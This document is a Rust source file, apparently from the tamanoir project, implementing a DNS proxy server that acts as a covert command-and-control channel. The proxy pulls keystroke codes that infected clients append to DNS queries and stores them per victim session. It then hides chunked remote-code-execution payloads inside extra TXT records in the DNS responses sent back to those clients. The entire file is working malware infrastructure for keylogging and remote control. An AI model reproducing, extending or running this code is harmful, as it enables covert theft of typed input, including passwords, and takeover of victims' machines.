use std::{
    collections::{hash_map::Entry, HashMap},
    net::{Ipv4Addr, SocketAddr},
    sync::Arc,
};

use anyhow::Error;
use chrono::Utc;
use log::{debug, error, info};
use tamanoir_common::{ContinuationByte, TargetArch};
use tokio::{net::UdpSocket, sync::Mutex};

use crate::{Session, SessionsStore, AR_COUNT_OFFSET, AR_HEADER_LEN, FOOTER_LEN, FOOTER_TXT};

pub fn max_payload_length(current_dns_packet_size: usize) -> usize {
    512usize
        .saturating_sub(current_dns_packet_size)
        .saturating_sub(FOOTER_LEN + AR_HEADER_LEN)
}

pub async fn mangle(
    data: &[u8],
    addr: SocketAddr,
    payload_len: usize,
    sessions: Arc<Mutex<HashMap<Ipv4Addr, Session>>>,
) -> anyhow::Result<Vec<u8>> {
    if data.len() <= payload_len {
        return Err(Error::msg("data to short"));
    }
    let mut current_sessions = sessions.lock().await;
    let mut payload_it = data[data.len() - payload_len..].iter();

    let arch = TargetArch::try_from(*payload_it.next().ok_or(Error::msg("data to short"))?)
        .map_err(|e| anyhow::anyhow!("Invalid first byte: {}", e))?; //first byte is target arch
    let payload: Vec<u8> = payload_it.copied().collect();

    let mut data = data[..(data.len().saturating_sub(payload_len))].to_vec();
    //Add recursion bytes (DNS)
    data[2] = 1;
    data[3] = 32;
    let session_obj: Session = Session::new(addr, arch).unwrap();
    // if let std::collections::hash_map::Entry::Vacant(e) = current_sessions.entry(session.ip) {
    //     info!("Adding new session for client: {} ", session.ip);
    //     e.insert(session.clone());
    // }

    let current_session = current_sessions.get_mut(&session_obj.ip).unwrap();
    if current_session.arch == TargetArch::Unknown {
        current_session.arch = session_obj.arch
    }
    for k in payload {
        current_session.key_codes.push(k)
    }

    Ok(data)
}

pub async fn forward_req(data: &Vec<u8>, dns_ip: Ipv4Addr) -> Result<Vec<u8>, u8> {
    debug!("Forwarding {} bytes", data.len());
    let sock = UdpSocket::bind("0.0.0.0:0").await.map_err(|_| 0u8)?;
    let remote_addr = format!("{}:53", dns_ip);
    sock.send_to(data.as_slice(), remote_addr)
        .await
        .map_err(|_| 0u8)?;
    let mut buf = vec![0u8; 512];
    let (len, _) = sock.recv_from(&mut buf).await.map_err(|_| 0u8)?;
    Ok(buf[..len].to_vec())
}

pub async fn add_info(
    data: &mut Vec<u8>,
    payload: &[u8],
    c_byte: ContinuationByte,
) -> anyhow::Result<Vec<u8>> {
    let mut n_ar = u16::from_be_bytes([data[AR_COUNT_OFFSET], data[AR_COUNT_OFFSET + 1]]);

    // we add a record
    n_ar += 1;
    let new_ar = n_ar.to_be_bytes();
    data[AR_COUNT_OFFSET] = new_ar[0];
    data[AR_COUNT_OFFSET + 1] = new_ar[1];

    let mut record = Vec::new();
    record.push(0u8); // no name
    record.extend_from_slice(&16u16.to_be_bytes()); // Type TXT
    record.extend_from_slice(&3u16.to_be_bytes()); // Class Chaos

    record.extend_from_slice(&300u32.to_be_bytes()); //TTL
    let payload_len = payload.len() as u16;
    let c_byte = c_byte as u8;

    let payload = [
        payload,
        FOOTER_TXT.as_bytes(),
        &[c_byte],
        &payload_len.to_le_bytes(),
    ]
    .concat();
    record.extend_from_slice(&((payload.len() + 1) as u16).to_be_bytes()); //Data Length
    record.push(payload.len() as u8); //TXT Length
    record.extend_from_slice(&payload); //TXT
    data.extend(record);
    Ok(data.clone())
}

pub struct DnsProxy {
    port: u16,
    forward_ip: Ipv4Addr,
    in_payload_len: usize,
}
impl DnsProxy {
    pub fn new(port: u16, forward_ip: Ipv4Addr, in_payload_len: usize) -> Self {
        Self {
            port,
            forward_ip,
            in_payload_len,
        }
    }
    pub async fn serve(&self, sessions_store: SessionsStore) -> anyhow::Result<()> {
        {
            info!("Starting dns proxy server");
            let sock = UdpSocket::bind(format!("0.0.0.0:{}", self.port)).await?;
            debug!(
                "DNS proxy is listening on {}",
                format!("0.0.0.0:{}", self.port)
            );

            loop {
                let mut buf = [0u8; 512];
                let (len, addr) = sock.recv_from(&mut buf).await?;
                let ret = self
                    .handle_request(len, buf, addr, sessions_store.clone(), &sock)
                    .await;
                if let Err(e) = ret {
                    error!("Error handling request: {}", e);
                }
            }
        }
    }
    pub async fn handle_request(
        &self,
        len: usize,
        buf: [u8; 512],
        addr: SocketAddr,
        sessions_store: SessionsStore,
        sock: &UdpSocket,
    ) -> anyhow::Result<()> {
        let s = Session::new(addr, TargetArch::Unknown).ok_or(Error::msg(format!(
            "couldn't parse addr for session {}",
            addr
        )))?;
        match s.ip.octets() {
            [127, 0, 0, 1] => {
                // just forward hypotetical localhost queries
                if let Ok(data) = forward_req(&Vec::from(buf), self.forward_ip).await {
                    let _ = sock.send_to(&data, addr).await?;
                    return Ok(());
                }
            }
            _ => {}
        };
        {
            let mut current_sessions = sessions_store.sessions.lock().await;
            if let Entry::Vacant(e) = current_sessions.entry(s.ip) {
                info!("Adding new session for client: {} ", s.ip);
                e.insert(s.clone());
                sessions_store.notify_update(s.clone())?;
            } else {
                let current_session = current_sessions.get_mut(&s.ip).unwrap();
                current_session.latest_packet = Utc::now();
                current_session.n_packets += 1;
            }
        }
        debug!("{:?} bytes received from {:?}", len, addr);
        let data = mangle(
            &buf[..len],
            addr,
            self.in_payload_len,
            sessions_store.sessions.clone(),
        )
        .await?;
        if let Ok(mut data) = forward_req(&data, self.forward_ip).await {
            let payload_max_len = max_payload_length(data.len());
            debug!(
                "foward request, response : init len={} max rce payload len={}",
                data.len(),
                payload_max_len
            );
            let mut current_sessions = sessions_store.sessions.lock().await;
            let current_session = current_sessions.get_mut(&s.ip).unwrap();

            sessions_store.notify_update(current_session.clone())?;

            let data = match &mut current_session.rce_payload {
                Some(ref mut rce_payload) => {
                    if !rce_payload.buffer.is_empty() {
                        let is_start = rce_payload.buffer.len() == rce_payload.length;
                        let transmitted_payload: Vec<u8> = rce_payload
                            .buffer
                            .drain(0..payload_max_len.min(rce_payload.buffer.len()))
                            .collect();
                        debug!("PAYLOAD SZ={}", transmitted_payload.len());
                        let cbyte = if transmitted_payload.len() == rce_payload.length {
                            ContinuationByte::ResetEnd
                        } else if rce_payload.buffer.is_empty() {
                            ContinuationByte::End
                        } else if is_start {
                            ContinuationByte::Reset
                        } else {
                            ContinuationByte::Continue
                        };
                        let augmented_data =
                            add_info(&mut data, &transmitted_payload, cbyte).await?;
                        sessions_store.notify_update(current_session.clone())?;
                        augmented_data
                    } else {
                        data
                    }
                }
                None => data,
            };

            let len = sock.send_to(&data, addr).await?;
            debug!("{:?} bytes sent", len);
        }

        Ok(())
    }
}
